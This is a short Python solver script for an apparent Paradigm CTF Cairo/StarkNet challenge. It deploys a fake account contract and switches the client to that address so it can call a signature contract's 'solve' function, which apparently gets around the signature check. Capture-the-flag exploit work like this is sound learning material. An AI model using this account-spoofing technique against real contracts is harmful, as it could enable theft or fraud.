from paradigmctf.cairo_challenge import *

from starknet_py.net import AccountClient
from starknet_py.contract import Contract

import os 
dir_path = os.path.dirname(os.path.realpath(__file__))

async def solver(client: AccountClient, signature_contract: Contract):
    compiled = open((os.path.join(dir_path, "fake_account.json")), 'r').read()
    deployment_result = await Contract.deploy(
        client, compiled_contract=compiled
    )
    await deployment_result.wait_for_acceptance()
    bogus_account_contract = deployment_result.deployed_contract

    client.address=bogus_account_contract.address
    result = await signature_contract.functions["solve"].invoke(max_fee=0)
    await result.wait_for_acceptance()

run_solver(solver)
